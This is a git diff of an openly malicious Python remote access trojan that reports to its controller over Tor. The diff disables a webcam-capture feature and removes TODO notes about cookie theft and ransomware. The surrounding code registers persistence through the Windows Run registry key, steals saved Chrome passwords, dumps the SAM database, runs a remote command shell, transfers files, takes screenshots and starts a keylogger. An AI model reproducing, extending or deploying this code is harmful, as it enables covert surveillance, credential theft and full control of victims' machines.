@@ -1,13 +1,12 @@
-import cv2
+# import cv2
 import json
 import os
-import shutil
 import socket
 import subprocess
 import sys
 import threading
-import time
 from sys import platform
+from shutil import copyfile
 
 #importing tor network
 from tor_network import ClientSocket, Tor
@@ -109,40 +108,40 @@ def get_sam_dump():
         return f"An unexpected error occurred: {str(e)}"
 
 
+#USING WEBCAM FEATURE ADDS 40MB TO THE EXECUTABLE AS CV2 IS A LARGE LIBRARY
+# def capture_webcam():
+#     webcam = cv2.VideoCapture(0)
+#     webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
 
-def capture_webcam():
-    webcam = cv2.VideoCapture(0)
-    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
-
-    # Check if the webcam is available
-    if not webcam.isOpened():
-        print("No webcam available")
-        return
+#     # Check if the webcam is available
+#     if not webcam.isOpened():
+#         print("No webcam available")
+#         return
     
-    ret, frame = webcam.read()
+#     ret, frame = webcam.read()
 
-    # Check if the webcam was able to capture a frame
-    if not ret:
-        print("Failed to read frame from webcam")
-        return
+#     # Check if the webcam was able to capture a frame
+#     if not ret:
+#         print("Failed to read frame from webcam")
+#         return
 
-    webcam.release()
+#     webcam.release()
 
-    # Save the frame to a file
-    if platform == "win32" or platform == "darwin" or platform == "linux" or platform == "linux2":
-        is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
-        if is_success:
-            with open('.webcam.png', 'wb') as f:
-                f.write(im_buf_arr.tobytes())
-        else:
-            print("Failed to save webcam image")
+#     # Save the frame to a file
+#     if platform == "win32" or platform == "darwin" or platform == "linux" or platform == "linux2":
+#         is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
+#         if is_success:
+#             with open('.webcam.png', 'wb') as f:
+#                 f.write(im_buf_arr.tobytes())
+#         else:
+#             print("Failed to save webcam image")
 
 
 def persist(reg_name, copy_name):
     file_location = os.environ['appdata'] + '\\' + copy_name
     try:
         if not os.path.exists(file_location):
-            shutil.copyfile(sys.executable, file_location)
+            copyfile(sys.executable, file_location)
             subprocess.call(
                 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
                 shell=True)
@@ -180,12 +179,6 @@ def chrome_passwords():
         reliable_send('[-] Error getting passwords from chrome')
 
 
-# TODO get_chrome_cookies()
-# TODO encrypt_user_dir() ransomware element
-# TODO def encrypt_file_in_dir(file_name, key)
-# TODO def gen_key()
-# TODO def send_key(file_name, key)
-
 def shell():
     while True:
         command = reliable_recv()
@@ -199,11 +192,6 @@ def shell():
             pass  # END
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
-            # try:
-            #     os.chdir(command[3:])
-            #     reliable_send('[+] Changed working dir to ' + os.getcwd())
-            # except Exception as e:
-            #     reliable_send('[-] ' + str(e))
         elif command[:6] == 'upload':
             download_file(command[7:])
         elif command[:8] == 'download':
@@ -218,10 +206,10 @@ def shell():
             screenshot()
             upload_file('.screen.png')
             os.remove('.screen.png')
-        elif command[:6] == 'webcam':
-            capture_webcam()
-            upload_file('.webcam.png')
-            os.remove('.webcam.png')
+        # elif command[:6] == 'webcam':
+        #     capture_webcam()
+        #     upload_file('.webcam.png')
+        #     os.remove('.webcam.png')
         elif command[:12] == 'keylog_start':
             keylog = keylogger.Keylogger()
             t = threading.Thread(target=keylog.start)
